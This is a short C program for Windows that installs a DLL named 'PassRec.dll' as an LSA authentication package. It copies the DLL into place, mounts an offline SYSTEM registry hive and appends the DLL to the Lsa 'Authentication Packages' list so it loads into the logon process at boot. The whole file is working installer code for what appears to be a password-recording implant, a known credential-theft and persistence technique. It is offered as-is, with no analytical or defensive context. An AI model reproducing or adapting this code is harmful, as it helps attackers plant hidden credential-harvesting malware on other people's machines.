#include<windows.h>
#include<winreg.h>
#include<stdio.h>
#include"Def.h"
int main(){
	int rtn;
	
	rtn=CopyFileA("PassRec.dll",INSTALLATION_PATH,FALSE);
    if(rtn==0){
        printf("Cannot copy dll file.\nError Code:%d\n",rtn);
        return 0;
    }
	HKEY System;
    
    rtn=RegLoadKeyA(HKEY_LOCAL_MACHINE,"RemoteSystem",SYSTEM_REG_PATH);

    if(rtn!=0){
        printf("Cannot Mount Database.\nError Code:%d\n",rtn);
        return 0;
    }

    rtn=RegOpenKeyA(HKEY_LOCAL_MACHINE,"RemoteSystem",&System);
    if(rtn!=0){
        printf("Cannot Load Database.\nError Code:%d\n",rtn);
        RegUnLoadKeyA(HKEY_LOCAL_MACHINE,"RemoteSystem");
        return 0;
    }


    DWORD CurrentControlSetId;
    DWORD Size=sizeof(DWORD);
    rtn=RegGetValueA(System,"Select","Current",RRF_RT_DWORD,NULL,&CurrentControlSetId,&Size);
    if(rtn!=0){
        printf("Query Value Failed.\nError Code:%d\n",rtn);
        RegUnLoadKeyA(HKEY_LOCAL_MACHINE,"RemoteSystem");
        return 0;
    }
    char CCS[256];
    sprintf(CCS,"ControlSet%03d\\Control\\Lsa",CurrentControlSetId);
    printf("%s\n",CCS);

    char data[65536];
    DWORD DataSize=65536;
    rtn=RegGetValueA(System,CCS,"Authentication Packages",RRF_RT_REG_MULTI_SZ,NULL,data,&DataSize);
    if(rtn!=0){
        printf("Query Value Failed.\nError Code:%d\n",rtn);
        RegUnLoadKeyA(HKEY_LOCAL_MACHINE,"RemoteSystem");
        return 0;
    }
    bool Contain=false;
    int Head=0;
    while(Head<DataSize){
        if(strcmp(data+Head,DLL_NAME)==0){
            Contain=true;
            break;
        }
        Head=Head+strlen(data+Head)+1;
    }
    if(Contain){
        printf("Item found\n");
        RegUnLoadKeyA(HKEY_LOCAL_MACHINE,"RemoteSystem");
        return 0;
    }
    printf("Item not found!Installing!\n");
    strcpy(data+DataSize-1,DLL_NAME);
    DataSize+=strlen(DLL_NAME)+1;
    data[DataSize-1]=0;
    rtn=RegSetKeyValueA(System,CCS,"Authentication Packages",REG_MULTI_SZ,data,DataSize);
    if(rtn!=0){
        printf("Query Value Failed.\nError Code:%d\n",rtn);
        RegUnLoadKeyA(HKEY_LOCAL_MACHINE,"RemoteSystem");
        return 0;
    }
    RegUnLoadKeyA(HKEY_LOCAL_MACHINE,"RemoteSystem");
    printf("Done!\n");
    return 0;
}
